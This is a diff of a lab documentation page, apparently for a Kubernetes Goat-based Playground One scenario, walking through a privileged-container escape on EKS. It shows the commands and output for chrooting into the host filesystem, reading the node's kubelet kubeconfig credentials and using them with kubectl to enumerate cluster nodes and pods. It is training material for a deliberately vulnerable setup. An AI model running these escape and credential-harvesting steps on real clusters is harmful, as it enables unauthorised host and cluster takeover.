@@ -879,8 +879,13 @@
 <ul>
 <li>Vision One Container Security</li>
 <li>Playground One EKS Cluster</li>
+<li>Playground One Scenarios</li>
 <li>Running app: System Monitor</li>
 </ul>
+<p>Ensure to have the EKS Cluster including the Scenarios up and running:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$<span class="w"> </span>pgo<span class="w"> </span>--apply<span class="w"> </span>eks
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>$<span class="w"> </span>pgo<span class="w"> </span>--apply<span class="w"> </span>scenarios
+</code></pre></div>
 <h2 id="attribution">Attribution<a class="headerlink" href="#attribution" title="Permanent link">&para;</a></h2>
 <p>This scenario is based on <a href="https://madhuakula.com/kubernetes-goat/docs/">Kubernetes Goat</a> but adapted to work an Playground One and EKS.</p>
 <h2 id="disclaimer">Disclaimer<a class="headerlink" href="#disclaimer" title="Permanent link">&para;</a></h2>
@@ -925,134 +930,134 @@ You can recon the system, some interesting places to obtain the node level confi
 
 After performing the analysis, you can identify that this container has full privileges of the host system and allows privilege escalation. As well as `/host-system` is mounted.
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$<span class="w"> </span>capsh<span class="w"> </span>--print
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>$<span class="w"> </span>capsh<span class="w"> </span>--print
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>$<span class="w"> </span>mount
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$<span class="w"> </span>mount
 </code></pre></div>
 
 Now you can explore the mounted file system by navigating to the `/host-system` path
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$<span class="w"> </span>ls<span class="w"> </span>/host-system/
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$<span class="w"> </span>ls<span class="w"> </span>/host-system/
 </code></pre></div>
 
 You can gain access to the host system privileges using `chroot`.
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$<span class="w"> </span>chroot<span class="w"> </span>/host-system<span class="w"> </span>bash
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>$<span class="w"> </span>chroot<span class="w"> </span>/host-system<span class="w"> </span>bash
 </code></pre></div>
 
 As you can see, now you can access all the host system resources like docker containers, configurations, etc.
 
 Trying to use the docker client fails.
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>$<span class="w"> </span>docker<span class="w"> </span>ps
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>$<span class="w"> </span>docker<span class="w"> </span>ps
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>bash: docker: command not found
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>bash: docker: command not found
 </code></pre></div>
 
 This does not work, since we're on a Kubernetes optimized node OS with no docker provided.
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>$<span class="w"> </span>uname<span class="w"> </span>-a
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>$<span class="w"> </span>uname<span class="w"> </span>-a
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Linux system-monitor-6dfbdbb7d-w6mdv 5.10.184-175.749.amzn2.x86_64 #1 SMP Wed Jul 12 18:40:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Linux system-monitor-6dfbdbb7d-w6mdv 5.10.184-175.749.amzn2.x86_64 #1 SMP Wed Jul 12 18:40:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 </code></pre></div>
 
 The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If you can use this configuration, you gain the same privileges as the Kubernetes node.
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>$<span class="w"> </span>cat<span class="w"> </span>/var/lib/kubelet/kubeconfig
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>$<span class="w"> </span>cat<span class="w"> </span>/var/lib/kubelet/kubeconfig
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>apiVersion: v1
-<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>kind: Config
-<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>clusters:
-<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>- cluster:
-<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>    certificate-authority: /etc/kubernetes/pki/ca.crt
-<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>    server: https://BD215DBE2E4127977439D904B2AD3307.gr7.eu-central-1.eks.amazonaws.com
-<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>  name: kubernetes
-<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>contexts:
-<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>- context:
-<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>    cluster: kubernetes
-<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>    user: kubelet
-<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>  name: kubelet
-<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>current-context: kubelet
-<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>users:
-<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>- name: kubelet
-<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>  user:
-<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>    exec:
-<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>      apiVersion: client.authentication.k8s.io/v1beta1
-<a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>      command: /usr/bin/aws-iam-authenticator
-<a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>      args:
-<a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>        - &quot;token&quot;
-<a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>        - &quot;-i&quot;
-<a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>        - &quot;playground-one-eks&quot;
-<a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>        - --region
-<a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>        - &quot;eu-central-1&quot;
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>apiVersion: v1
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>kind: Config
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>clusters:
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>- cluster:
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>    certificate-authority: /etc/kubernetes/pki/ca.crt
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>    server: https://BD215DBE2E4127977439D904B2AD3307.gr7.eu-central-1.eks.amazonaws.com
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>  name: kubernetes
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>contexts:
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>- context:
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>    cluster: kubernetes
+<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>    user: kubelet
+<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>  name: kubelet
+<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>current-context: kubelet
+<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>users:
+<a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>- name: kubelet
+<a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>  user:
+<a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>    exec:
+<a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>      apiVersion: client.authentication.k8s.io/v1beta1
+<a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a>      command: /usr/bin/aws-iam-authenticator
+<a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a>      args:
+<a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a>        - &quot;token&quot;
+<a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a>        - &quot;-i&quot;
+<a id="__codelineno-10-23" name="__codelineno-10-23" href="#__codelineno-10-23"></a>        - &quot;playground-one-eks&quot;
+<a id="__codelineno-10-24" name="__codelineno-10-24" href="#__codelineno-10-24"></a>        - --region
+<a id="__codelineno-10-25" name="__codelineno-10-25" href="#__codelineno-10-25"></a>        - &quot;eu-central-1&quot;
 </code></pre></div>
 
 Sadly, there is no `kubectl` as well.
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>$<span class="w"> </span>kubectl
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>$<span class="w"> </span>kubectl
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>bash: kubectl: command not found
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>bash: kubectl: command not found
 </code></pre></div>
 
 Trying to use the package manager `yum` will not solve the problem. But navigating to https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux will help:
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>$<span class="w"> </span><span class="nb">cd</span>
-<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>$<span class="w"> </span>curl<span class="w"> </span>-LO<span class="w"> </span><span class="s2">&quot;https://dl.k8s.io/release/</span><span class="k">$(</span>curl<span class="w"> </span>-L<span class="w"> </span>-s<span class="w"> </span>https://dl.k8s.io/release/stable.txt<span class="k">)</span><span class="s2">/bin/linux/amd64/kubectl&quot;</span>
-<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>$<span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>kubectl
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>$<span class="w"> </span><span class="nb">cd</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>$<span class="w"> </span>curl<span class="w"> </span>-LO<span class="w"> </span><span class="s2">&quot;https://dl.k8s.io/release/</span><span class="k">$(</span>curl<span class="w"> </span>-L<span class="w"> </span>-s<span class="w"> </span>https://dl.k8s.io/release/stable.txt<span class="k">)</span><span class="s2">/bin/linux/amd64/kubectl&quot;</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>$<span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>kubectl
 </code></pre></div>
 
 Try to get the available nodes of our cluster:
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>$<span class="w"> </span>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>nodes<span class="w"> </span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>$<span class="w"> </span>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>nodes<span class="w"> </span>
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>NAME                                            STATUS   ROLES    AGE   VERSION
-<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>ip-10-0-152-251.eu-central-1.compute.internal   Ready    &lt;none&gt;   56m   v1.25.11-eks-a5565ad
-<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>ip-10-0-169-117.eu-central-1.compute.internal   Ready    &lt;none&gt;   56m   v1.25.11-eks-a5565ad
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>NAME                                            STATUS   ROLES    AGE   VERSION
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>ip-10-0-152-251.eu-central-1.compute.internal   Ready    &lt;none&gt;   56m   v1.25.11-eks-a5565ad
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>ip-10-0-169-117.eu-central-1.compute.internal   Ready    &lt;none&gt;   56m   v1.25.11-eks-a5565ad
 </code></pre></div>
 
 Can you do more?
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>$<span class="w"> </span>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>pods<span class="w"> </span>-A
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>$<span class="w"> </span>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>pods<span class="w"> </span>-A
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>NAMESPACE           NAME                                               READY   STATUS    RESTARTS   AGE
-<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>goat                system-monitor-6dfbdbb7d-w6mdv                     1/1     Running   0          53m
-<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>kube-system         aws-load-balancer-controller-577dcc6f77-sqtfr      1/1     Running   0          92m
-<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>kube-system         aws-node-8wl6v                                     1/1     Running   0          92m
-<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>kube-system         aws-node-ksdjv                                     1/1     Running   0          92m
-<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>kube-system         cluster-autoscaler-6696cf9bff-2s52q                1/1     Running   0          92m
-<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>kube-system         coredns-6bcddfff7-hrwwl                            1/1     Running   0          92m
-<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>kube-system         coredns-6bcddfff7-kp266                            1/1     Running   0          92m
-<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>kube-system         ebs-csi-controller-7dffd5b9fd-2w7r8                6/6     Running   0          92m
-<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>kube-system         ebs-csi-controller-7dffd5b9fd-fdhfc                6/6     Running   0          92m
-<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>kube-system         ebs-csi-node-k77sx                                 3/3     Running   0          92m
-<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>kube-system         ebs-csi-node-vj6c7                                 3/3     Running   0          92m
-<a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>kube-system         kube-proxy-62dls                                   1/1     Running   0          92m
-<a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a>kube-system         kube-proxy-mshz7                                   1/1     Running   0          92m
-<a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a>trendmicro-system   trendmicro-admission-controller-74d8d7f866-dv87r   1/1     Running   0          53m
-<a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a>trendmicro-system   trendmicro-oversight-controller-557df87c9-6c4dx    2/2     Running   0          69m
-<a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a>trendmicro-system   trendmicro-scan-manager-6ddb6f69b8-r85dk           1/1     Running   0          53m
-<a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a>trendmicro-system   trendmicro-scout-gkl4k                             2/2     Running   0          69m
-<a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a>trendmicro-system   trendmicro-scout-tz68w                             2/2     Running   0          69m
-<a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a>trendmicro-system   trendmicro-usage-controller-6944c5b55b-m8hgh       2/2     Running   0          53m
-<a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a>trendmicro-system   trendmicro-workload-operator-6cf5c98c6f-xq8bb      1/1     Running   0          69m
-<a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a>trivy-system        trivy-operator-57c774d7c4-hmnlk                    1/1     Running   0          53m
-<a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a>victims             java-goof-5878dd4dd-9lnst                          1/1     Running   0          53m
-<a id="__codelineno-16-24" name="__codelineno-16-24" href="#__codelineno-16-24"></a>victims             web-app-854bdf944f-ddqcs                           1/1     Running   0          53m
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>NAMESPACE           NAME                                               READY   STATUS    RESTARTS   AGE
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>goat                system-monitor-6dfbdbb7d-w6mdv                     1/1     Running   0          53m
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>kube-system         aws-load-balancer-controller-577dcc6f77-sqtfr      1/1     Running   0          92m
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>kube-system         aws-node-8wl6v                                     1/1     Running   0          92m
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>kube-system         aws-node-ksdjv                                     1/1     Running   0          92m
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>kube-system         cluster-autoscaler-6696cf9bff-2s52q                1/1     Running   0          92m
+<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>kube-system         coredns-6bcddfff7-hrwwl                            1/1     Running   0          92m
+<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>kube-system         coredns-6bcddfff7-kp266                            1/1     Running   0          92m
+<a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>kube-system         ebs-csi-controller-7dffd5b9fd-2w7r8                6/6     Running   0          92m
+<a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>kube-system         ebs-csi-controller-7dffd5b9fd-fdhfc                6/6     Running   0          92m
+<a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>kube-system         ebs-csi-node-k77sx                                 3/3     Running   0          92m
+<a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>kube-system         ebs-csi-node-vj6c7                                 3/3     Running   0          92m
+<a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>kube-system         kube-proxy-62dls                                   1/1     Running   0          92m
+<a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>kube-system         kube-proxy-mshz7                                   1/1     Running   0          92m
+<a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>trendmicro-system   trendmicro-admission-controller-74d8d7f866-dv87r   1/1     Running   0          53m
+<a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>trendmicro-system   trendmicro-oversight-controller-557df87c9-6c4dx    2/2     Running   0          69m
+<a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>trendmicro-system   trendmicro-scan-manager-6ddb6f69b8-r85dk           1/1     Running   0          53m
+<a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>trendmicro-system   trendmicro-scout-gkl4k                             2/2     Running   0          69m
+<a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>trendmicro-system   trendmicro-scout-tz68w                             2/2     Running   0          69m
+<a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>trendmicro-system   trendmicro-usage-controller-6944c5b55b-m8hgh       2/2     Running   0          53m
+<a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>trendmicro-system   trendmicro-workload-operator-6cf5c98c6f-xq8bb      1/1     Running   0          69m
+<a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a>trivy-system        trivy-operator-57c774d7c4-hmnlk                    1/1     Running   0          53m
+<a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>victims             java-goof-5878dd4dd-9lnst                          1/1     Running   0          53m
+<a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a>victims             web-app-854bdf944f-ddqcs                           1/1     Running   0          53m
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>$<span class="w"> </span>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>nodes<span class="w"> </span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>$<span class="w"> </span>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>nodes<span class="w"> </span>
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>NAME                                            STATUS   ROLES    AGE   VERSION
-<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>ip-10-0-152-251.eu-central-1.compute.internal   Ready    &lt;none&gt;   76m   v1.25.11-eks-a5565ad
-<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>ip-10-0-169-117.eu-central-1.compute.internal   Ready    &lt;none&gt;   76m   v1.25.11-eks-a5565ad
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>NAME                                            STATUS   ROLES    AGE   VERSION
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>ip-10-0-152-251.eu-central-1.compute.internal   Ready    &lt;none&gt;   76m   v1.25.11-eks-a5565ad
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>ip-10-0-169-117.eu-central-1.compute.internal   Ready    &lt;none&gt;   76m   v1.25.11-eks-a5565ad
 </code></pre></div>
 
 🎉 Success 🎉
